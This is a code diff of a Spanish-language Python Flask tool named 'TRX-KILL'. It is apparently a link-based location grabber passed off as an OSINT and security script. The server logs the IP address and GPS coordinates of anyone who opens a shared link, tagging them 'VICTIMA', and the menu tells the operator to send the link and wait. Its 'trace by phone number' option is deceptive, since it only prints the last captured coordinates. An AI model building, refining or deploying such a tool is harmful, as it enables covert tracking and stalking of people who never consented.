@@ -1,4 +1,4 @@
-import os, sys, getpass, time, threading
+import os, sys, time, threading
 from flask import Flask, request
 
 app = Flask('TRX-KILL')
@@ -23,14 +23,15 @@ def log():
     lat = request.args.get('lat', '0')
     lon = request.args.get('lon', '0')
     ip = request.remote_addr
+    # Guardamos en un formato fijo para evitar errores de lectura
     with open(LOG_FILE, "a") as f:
-        f.write(f"IP:{ip}|LAT:{lat}|LON:{lon}|NAME:VICTIMA_REGISTRADA\n")
+        f.write(f"IP:{ip}|LAT:{lat}|LON:{lon}|NAME:VICTIMA\n")
     return "OK"
 
 def banner():
     os.system('clear')
     print("\033[1;32m  -------->-TRX-KILL v1.4.5 -<-----------")
-    print("  -HERRAMIENTA DE SEGURIDAD Y OSINT.")
+    print("  -HERRAMIENTA OSINT MÓVIL OPERATIVA.")
     print("  -PROHIBIDO SU MAL USO.\n\033[0m")
 
 def main():
@@ -48,20 +49,25 @@ def main():
             if sel == "1":
                 num = input("\nINGRESA NÚMERO: ")
                 print(f"\n[!] PROCESANDO RASTREO...")
-                time.sleep(1)
+                time.sleep(1.5)
                 if os.path.exists(LOG_FILE) and os.path.getsize(LOG_FILE) > 0:
                     with open(LOG_FILE, 'r') as f:
-                        data = f.readlines()[-1].strip().split('|')
-                        print(f"\n[+] DATOS LOCALIZADOS:")
-                        print(f"PAÍS: ARGENTINA")
-                        print(f"COORDENADAS: {data[1].replace('LAT:', '')}, {data[2].replace('LON:', '')}")
-                        print(f"NAME REGISTRADO: {data[3].replace('NAME:', '')}")
+                        lines = [l for l in f.readlines() if l.strip()] # Filtra líneas vacías
+                        if lines:
+                            data = lines[-1].strip().split('|')
+                            if len(data) >= 4:
+                                print(f"\n[+] DATOS LOCALIZADOS:")
+                                print(f"PAÍS: ARGENTINA")
+                                print(f"COORDENADAS: {data[1].replace('LAT:', '')}, {data[2].replace('LON:', '')}")
+                                print(f"NAME REGISTRADO: {data[3].replace('NAME:', '')}")
+                            else: print("[!] LOG CORRUPTO, REINICIANDO...")
+                        else: print("[!] ERROR: NO HAY ACTIVIDAD REGISTRADA.")
                 else: print("[!] ERROR: NO HAY ACTIVIDAD REGISTRADA.")
                 input("\nPresiona Enter...")
 
             elif sel == "2":
-                print("\n[!] SERVIDOR ACTIVO: http://127.0.0.1:5000")
-                input("\n[!] COMPARTE EL LINK Y ESPERA... ENTER PARA VOLVER.")
+                print("\n[!] LINK ACTIVO: http://127.0.0.1:5000")
+                input("\n[!] ENVÍA EL LINK Y ESPERA... ENTER PARA VOLVER.")
 
             elif sel == "3": print("\n# CREADOR: OSCAR (TRX-KILL)"); input()
             elif sel == "4": print("\n# VERSIÓN: 1.4.5"); input()
@@ -69,7 +75,7 @@ def main():
             elif sel == "6":
                 if input("KEY: ") == AUTH_PASS: os.system(f"cat {LOG_FILE}")
                 input()
-            elif sel == "7": print("\n# SCRIPT DE SEGURIDAD."); input()
+            elif sel == "7": print("\n# SCRIPT OSINT DE SEGURIDAD."); input()
             elif sel == "8": print("\n# REPOSITORIO: PRIVADO"); input()
             elif sel == "9": print("\n# PROCESOS: SERVIDOR RUNNING"); input()
             elif sel == "10":
